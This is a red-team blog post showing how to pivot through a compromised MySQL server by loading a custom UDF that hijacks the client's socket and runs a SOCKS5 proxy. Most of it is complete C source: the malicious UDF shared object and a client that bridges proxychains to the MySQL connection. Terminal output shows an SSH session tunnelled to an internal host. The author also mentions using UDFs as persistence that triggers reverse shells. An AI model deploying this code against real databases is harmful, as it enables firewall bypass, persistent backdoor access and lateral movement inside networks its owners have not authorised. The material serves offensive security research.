---
layout: post
title: Tunneling traffic through MySQL service (or your mysqld is my new SOCKS5)
date: 2019-12-06 13:48:08
categories: posts
en: true
description: Description of how to pivot though the MySQL service. Turning MySQL into a SOCKS5 that can be used by proxychains.
keywords: "RedTeam, Red Team, socks5, udf, mysql, mysqld, proxychains, pivoting"
authors:
    - X-C3LL
---
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
When executing a Red Team exercise I like to use UDFs as persistence because it usually does not caught and are easy to trigger in order to pop a shell again. Recently our Red Team had to overcome a situation where the access to a machine was blocked with a network firewall, so only the traffic to the database service was allowed. In this case, our classical UDF that triggers a reverse shell was f*cked because it can not connect back to us because of the firewall. Maybe an option for this kind of situations can be an UDF that does something like __do_system("my shiny command")__ and shows the output, but that is very uncomfortable.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
I liked more the idea of using the same client connection to handle the shell. Even better: we can reuse the client connection to tunnel traffic and use the MySQL service as a proxy, letting us attack other machines in the network. If the firewall only let us to use the MySQL service, let's use it to pivot and re-conquer the intranet! __:)__

__Disclaimer:__ _The code is awful as hell. Read the ideas and implement them as you need, but please do not use this code (it is just a proof of concept). It might cause diseases to you._

## User-Defined Functions (UDFs) and MySQL
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The functionalities of MySQL can be expanded with custom functions called ["User-Defined Functions"](https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html) or "UDF". These new functions are implemented in a shared object that will be loaded by MySQL, so they are accesible via traditional querys (__select your_function('pwn');__).

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
If you are old enough maybe you can remember the ["Raptor / do_system" exploit](https://www.exploit-db.com/exploits/1518) which used an UDF to execute commands as root. We can use this code as a skeleton to build our own UDF:

```c
#include <stdio.h>
#include <stdlib.h>

typedef struct st_udf_args {
    unsigned int        arg_count;  // number of arguments
    enum Item_result    *arg_type;  // pointer to item_result
    char            **args;     // pointer to arguments
    unsigned long       *lengths;   // length of string args
    char            *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;
 
typedef struct st_udf_init {
    char            maybe_null; // 1 if func can return NULL
    unsigned int        decimals;   // for real functions
    unsigned long       max_length; // for string functions
    char            *ptr;       // free ptr for func data
    char            const_item; // 0 if result is constant
} UDF_INIT;

int do_carracha(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
	// Magic & Unicorns
	return 1;
}

char do_carracha_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Just `gcc -shared -o carracha.so carracha.c -fPIC`, move the file to the plugin dir and load the function inside MySQL (`create function do_carracha returns integer soname 'carracha.so';`). Let's move to the interesting things!


## In the hunt of the sacred socket
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
As we said before, our main purpose with this UDF is to reuse the connection made by the client so we can proxy all our TCP traffic through a legitimate connection. If we know what file descriptor is the one used by our connection, we can reuse it easily. Unfortunally, we can not know directly what file descriptor is being used by the connection, so we need to bruteforce them until we find the correct. This is a really old (I mean really really really old) technique used in exploiting that is well described [in this article from NetSec](https://nets.ec/Shellcode/Socket-reuse). 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
First we need to know what is the range of file descriptors that we need to bruteforce. To do that, we can for example open a new socket and save the file descriptor returned, so this number will be our top limit:

```c
int do_carracha(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
	...
	int fd;

	fd = socket(AF_UNIX, SOCK_STREAM, 0);
	close(fd);
	...
}
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Once we know the range to be bruteforced we are going to use [getpeername](http://man7.org/linux/man-pages/man2/getpeername.2.html) to determine if the file descriptor refers to a valid socket and if the address of the peer connected to the socket is ours.

```c
...
	for (i = 3; i < fd; i++) {
		ret = getpeername(i, (struct sockaddr *)&client_addr, &addr_size);
			if (ret == 0) {
				char ip[INET6_ADDRSTRLEN];
			
				if (client_addr.ss_family == AF_INET) {
					struct sockaddr_in *s = (struct sockaddr_in *)&client_addr;
					inet_ntop(AF_INET, &s->sin_addr, ip, sizeof(ip));
				}
				else if (client_addr.ss_family == AF_INET6) {
					struct sockaddr_in6 *s = (struct sockaddr_in6 *)&client_addr;
					inet_ntop(AF_INET6, &s->sin6_addr, ip, sizeof(ip));
				}

				if (strstr(ip, "X.X.X.X")) { // Hardcoded because it is a PoC. We should take this value from function argument (do_carracha('ip'))
					write(i, "Now I am become Death\n", strlen("Now I am become Death\n") + 1); // Say hello to our client!
					}
				} 
		}
		memset(&client_addr, 0, sizeof(client_addr));
	}
...
```


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In a few lines we have hunted the sacred socket __:)__. Now let's move to the client side!

## Connecting proxychains to the MySQL service
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The easiest way to initiate the communication is using the MySQL C API. We are going to take the sample code from this [tutorial](http://zetcode.com/db/mysqlc/) to stablish the connection with the server and then use directly the opened socket to execute the query (__do_carracha('whatever')__) and start the communication:

```c
void proxy_init(int sock){
	...
	write(sock, "\31\x00\x00\00\x03select do_carracha('a');", 30); // Execute query "select do_carracha('a')"
	...
}

int main (int argc, char **argv) {
	MYSQL *con = mysql_init(NULL);
	
	if (con == NULL) {
		fprintf(stderr, "%s\n", mysql_error(con));
		exit(1);
	}
	if (mysql_real_connect(con, "Y.Y.Y.Y", "username", "password", NULL, 0, NULL, 0) == NULL) {
		fprintf(stderr, "%s\n", mysql_error(con));
		mysql_close(con);
		exit(1);
	}

	proxy_init(3); // 3 is the socket (0 -> stdin, 1 -> stdout, 2 -> stderr)
	exit(0);
}
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Our client is going to take care of open a local port and forward messages between proxychains and the MySQL connection, so whatever it receives from proxychains is going to be sent to the server and viceversa. This can be accomplished with selects (check the final PoC).

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
At this point we have a client to communicate proxychains with the MySQL service and a UDF that will reuse the client's socket to send/receive messages. The only remaining thing to solve is to implement the SOCKS5 logic in the UDF.


## Adding the SOCKS5 logic to the UDF
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
I do not like the idea of reinveting the wheel, so I am going to reuse this [SOCKS5 implementation](https://github.com/fgssfgss/socks_proxy). Indeed I am going to reuse a slightly edited version that I used in [mod_ringbuilder](https://github.com/TarlogicSecurity/mod_ringbuilder) (an Apache backdoor, if you are interested in this topic check [Backdoors in XAMP stack (part III): Apache Modules](https://www.tarlogic.com/en/blog/backdoors-modulos-apache/)).

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
First we are going to fork the process (so we do not block nothing), call the proxy function with the hunted socket as argument in the child process and then close the socket in the parent.

```c
...
void *worker(int fd) {
	int inet_fd = -1;
	int command = 0;
	unsigned short int p = 0;
	socks5_invitation(fd);
	socks5_auth(fd);
	command = socks5_command(fd);
	if (command == IP) {
		char *ip = NULL;
		ip = socks5_ip_read(fd);
		p = socks5_read_port(fd);
		inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
		if (inet_fd == -1) {
			exit(0);
		}
		socks5_ip_send_response(fd, ip, p);
		free(ip);
    } 

	app_socket_pipe(inet_fd, fd);
	close(inet_fd);
	exit(0);
}

void proxy(int socks) {
	char a[1];
	write(socks, "And this is my Child\n", strlen("And this is my Child\n") + 1);
	read(socks, a, sizeof(a)); // 
	worker(socks);
	return;
}
int do_carracha(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
				...
				if (strstr(ip, "x.x.x.x")) {
					write(i, "Now I am become Death\n", strlen("Now I am become Death\n") + 1);
					pid = fork();
					if (pid == 0) {
						proxy(i);
						exit(0);	
					}	
					else {
						close(i);
						return 1;
					}
				} 
				...
}
```

## PoC || GTFO
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Here are the two files used in this PoC (as I said the code sucks a lot, please don't kill me):
```c
// SOCKS5 inside a UDF
// Based on https://github.com/fgssfgss/socks_proxy

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <sys/select.h>



#define BUFSIZE 65536
#define IPSIZE 4
#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x[0]))

typedef struct st_udf_args {
    unsigned int        arg_count;  // number of arguments
    enum Item_result    *arg_type;  // pointer to item_result
    char            **args;     // pointer to arguments
    unsigned long       *lengths;   // length of string args
    char            *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;
 
typedef struct st_udf_init {
    char            maybe_null; // 1 if func can return NULL
    unsigned int        decimals;   // for real functions
    unsigned long       max_length; // for string functions
    char            *ptr;       // free ptr for func data
    char            const_item; // 0 if result is constant
} UDF_INIT;



enum socks {
	RESERVED = 0x00,
	VERSION = 0x05
};

enum socks_auth_methods {
	NOAUTH = 0x00,
	USERPASS = 0x02,
	NOMETHOD = 0xff
};

enum socks_auth_userpass {
	AUTH_OK = 0x00,
	AUTH_VERSION = 0x01,
	AUTH_FAIL = 0xff
};

enum socks_command {
	CONNECT = 0x01
};

enum socks_command_type {
	IP = 0x01,
	DOMAIN = 0x03
};

enum socks_status {
	OK = 0x00,
	FAILED = 0x05
};


int readn(int fd, void *buf, int n)
{
	int nread, left = n;
	while (left > 0) {
		if ((nread = read(fd, buf, left)) == 0) {
			return 0;
		} else if (nread != -1){
			left -= nread;
			buf += nread;
		}
	}
	return n;
}


void socks5_invitation(int fd) {
	char init[2];
	readn(fd, (void *)init, ARRAY_SIZE(init));
	if (init[0] != VERSION) {
		exit(0);
	}
}

void socks5_auth(int fd) {
		char answer[2] = { VERSION, NOAUTH };
		write(fd, (void *)answer, ARRAY_SIZE(answer));
}

int socks5_command(int fd)
{
	char command[4];
	readn(fd, (void *)command, ARRAY_SIZE(command));
	return command[3];
}

char *socks5_ip_read(int fd)
{
	char *ip = malloc(sizeof(char) * IPSIZE);
	read(fd, (void* )ip, 2); //Buggy
	readn(fd, (void *)ip, IPSIZE);
	return ip;
}

unsigned short int socks5_read_port(int fd)
{
	unsigned short int p;
	readn(fd, (void *)&p, sizeof(p));
	return p;
}

int app_connect(int type, void *buf, unsigned short int portnum, int orig) {
	int new_fd = 0;
	struct sockaddr_in remote;
	char address[16];

	memset(address,0, ARRAY_SIZE(address));
	new_fd = socket(AF_INET, SOCK_STREAM,0);
	if (type == IP) {
		char *ip = NULL;
		ip = buf;
		snprintf(address, ARRAY_SIZE(address), "%hhu.%hhu.%hhu.%hhu",ip[0], ip[1], ip[2], ip[3]);
		memset(&remote, 0, sizeof(remote));
		remote.sin_family = AF_INET;
		remote.sin_addr.s_addr = inet_addr(address);
		remote.sin_port = htons(portnum);

		if (connect(new_fd, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
			return -1;
		}
		return new_fd;
	}
}

void socks5_ip_send_response(int fd, char *ip, unsigned short int port)
{
	char response[4] = { VERSION, OK, RESERVED, IP };
	write(fd, (void *)response, ARRAY_SIZE(response));
	write(fd, (void *)ip, IPSIZE);
	write(fd, (void *)&port, sizeof(port));
}


void app_socket_pipe(int fd0, int fd1)
{
	int maxfd, ret;
	fd_set rd_set;
	size_t nread;
	char buffer_r[BUFSIZE];

	maxfd = (fd0 > fd1) ? fd0 : fd1;
	while (1) {
		FD_ZERO(&rd_set);
		FD_SET(fd0, &rd_set);
		FD_SET(fd1, &rd_set);
		ret = select(maxfd + 1, &rd_set, NULL, NULL, NULL);

		if (ret < 0 && errno == EINTR) {
			continue;
		}

		if (FD_ISSET(fd0, &rd_set)) {
			nread = recv(fd0, buffer_r, BUFSIZE, 0);
			if (nread <= 0)
				break;
			send(fd1, (const void *)buffer_r, nread, 0);
		}

		if (FD_ISSET(fd1, &rd_set)) {
			nread = recv(fd1, buffer_r, BUFSIZE, 0);
			if (nread <= 0)
				break;
			send(fd0, (const void *)buffer_r, nread, 0);
		}
	}
}

void *worker(int fd) {
	int inet_fd = -1;
	int command = 0;
	unsigned short int p = 0;
	socks5_invitation(fd);
	socks5_auth(fd);
	command = socks5_command(fd);
	if (command == IP) {
		char *ip = NULL;
		ip = socks5_ip_read(fd);
		p = socks5_read_port(fd);
		inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
		if (inet_fd == -1) {
			exit(0);
		}
		socks5_ip_send_response(fd, ip, p);
		free(ip);
    } 

	app_socket_pipe(inet_fd, fd);
	close(inet_fd);
	exit(0);
}





void proxy(int socks) {
	char a[1];
	write(socks, "And this is my Child\n", strlen("And this is my Child\n") + 1);
	read(socks, a, sizeof(a)); // 
	worker(socks);
	return;
}
 
int do_carracha(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args->arg_count != 1)
        return(0);
	
	int fd, i, ret, pid;
 	struct sockaddr_storage client_addr;
	socklen_t addr_size = sizeof(client_addr);

    fd = socket(AF_UNIX, SOCK_STREAM, 0);
	close(fd);
	for (i = 3; i < fd; i++) {
		ret = getpeername(i, (struct sockaddr *)&client_addr, &addr_size);
			if (ret == 0) {
				char ip[INET6_ADDRSTRLEN];
			
				if (client_addr.ss_family == AF_INET) {
					struct sockaddr_in *s = (struct sockaddr_in *)&client_addr;
					inet_ntop(AF_INET, &s->sin_addr, ip, sizeof(ip));
				}
				else if (client_addr.ss_family == AF_INET6) {
					struct sockaddr_in6 *s = (struct sockaddr_in6 *)&client_addr;
					inet_ntop(AF_INET6, &s->sin6_addr, ip, sizeof(ip));
				}

				if (strstr(ip, "X.X.X.X")) {
					write(i, "Now I am become Death\n", strlen("Now I am become Death\n") + 1);
					pid = fork();
					if (pid == 0) {
						proxy(i);
						exit(0);	
					}	
					else {
						close(i);
						return 1;
					}
				} 
		}
		memset(&client_addr, 0, sizeof(client_addr));
	}
 	return fd;
    
}
 
char do_carracha_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}

```

```c
// PoC to communicate proxychains and SOCKS5 
#include <my_global.h>
#include <mysql.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <fcntl.h>



void proxy_init(int sock){
	fd_set readset;
	struct timeval tv;
	int i, retval, nread, localfd, clientlen, sr, maxfd, select_fd[2];
	char test[1024];
	struct sockaddr_in server, client;
	fprintf(stderr, "[ SERVER BANNER ]\n\n");
	write(sock, "\31\x00\x00\00\x03select do_carracha('a');", 30);

	select_fd[0] = sock;
	while(1) {https://nets.ec/Shellcode/Socket-reuse
		FD_ZERO(&readset);
		FD_SET(select_fd[0], &readset);
		tv.tv_sec = 1;
		tv.tv_usec = 0;
		retval = select(select_fd[0] + 1, &readset, NULL, NULL, &tv);
		if (retval) {
			nread = read(select_fd[0], test, sizeof(test));
			fprintf(stderr, "%s", test);
			if (strstr(test, "Child")) {
				break;
			}
		}
	}

	if ((localfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		fprintf(stderr, "\nERROR: could not open new socket!\n");
		exit(1);
	}
	

	server.sin_family = AF_INET;
	server.sin_port = htons(1337);
	server.sin_addr.s_addr = INADDR_ANY; 

	if (bind(localfd, (struct sockaddr *)&server, sizeof(server)) == -1) {
		fprintf(stderr, "\nERROR: could not bind!\n");
		exit(1);
	}
	
	if (listen(localfd,5) == -1) {
		fprintf(stderr, "\nERROR: could not listen!\n");
		exit(1);
	}

	clientlen = sizeof(client);
	fprintf(stderr, "\n[ RUN YOUR PROXYCHAINS NOW ]\n");
	
	if ((select_fd[1] = accept(localfd, (struct sockaddr *)&client, &clientlen)) == -1) {
		fprintf(stderr, "\nERROR: could not accept!\n");
		exit(1);
	}

	
	

	
	while(1) {
		tv.tv_sec = 1;
		tv.tv_usec = 0;
		FD_ZERO(&readset);
		maxfd = (select_fd[0] > select_fd[1])? select_fd[0] : select_fd[1];
		for (i = 0; i < 2; i++) {
			FD_SET(select_fd[i],  &readset);
		}
		sr = select(maxfd + 1, &readset, NULL, NULL, &tv);
		if (sr == -1) {
			fprintf(stderr, "ERROR: Select failed, something went reaaaally wrong!\n");
			exit(1);
		}
		if (sr) {
			for (i = 0; i < 2; i++) {
				if(FD_ISSET(select_fd[i], &readset)) {
					memset(test, 0, sizeof(test));
					if (i == 0) {
						nread = read(select_fd[0], test, sizeof(test));
						fprintf(stderr, "-> %d packets from server\n", nread);
						write(select_fd[1], test, nread);
					}
					else if (i == 1) {
						nread = read(select_fd[1], test, sizeof(test));
						if (nread <= 0){
							fprintf(stderr, "ERROR: could not read from proxychains!\n");
							exit(1);
						}
						fprintf(stderr, "<- %d packets from proxychains\n", nread);
						write(select_fd[0], test, nread);
					}
				}	
			}
		}
	}

	
	
}


int main (int argc, char **argv) {
	MYSQL *con = mysql_init(NULL);
	
	if (con == NULL) {
		fprintf(stderr, "%s\n", mysql_error(con));
		exit(1);
	}
	if (mysql_real_connect(con, "Y.Y.Y.Y", "username", "password", NULL, 0, NULL, 0) == NULL) {
		fprintf(stderr, "%s\n", mysql_error(con));
		mysql_close(con);
		exit(1);
	}

	proxy_init(3);
	exit(0);
}

```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Compile and run:

(Terminal 1)
```
root@insularaptor:/tmp# ./MyShellQL 
[ SERVER BANNER ]

Now I am become Death
And this is my Child

[ RUN YOUR PROXYCHAINS NOW ]
```

(Terminal 2)
```
root@insularaptor:/tmp# proxychains ssh mothra@192.168.245.197
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1337-<><>-192.168.245.197:22-<><>-OK
mothra@192.168.245.197's password: 
Linux arcadia 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Dec  7 19:22:36 2019 from 127.0.0.1
mothra@arcadia:~|⇒  exit
Connection to 192.168.245.197 closed.

```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Hohoho we just did ssh using the compromised MySQL service as proxy! What a lovely way to perform lateral movements! __:)__ 

## Final words
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
UDFs are a powerful tool to use in Red Team exercises or in classical pentests. I hope the idea of using mysqld to pivot can be useful to you, or at minimum, funny enough. If this article has been helpful to you, or you find an error/typo, feel free to contact me at [@TheXC3LL](https://twitter.com/TheXC3LL).
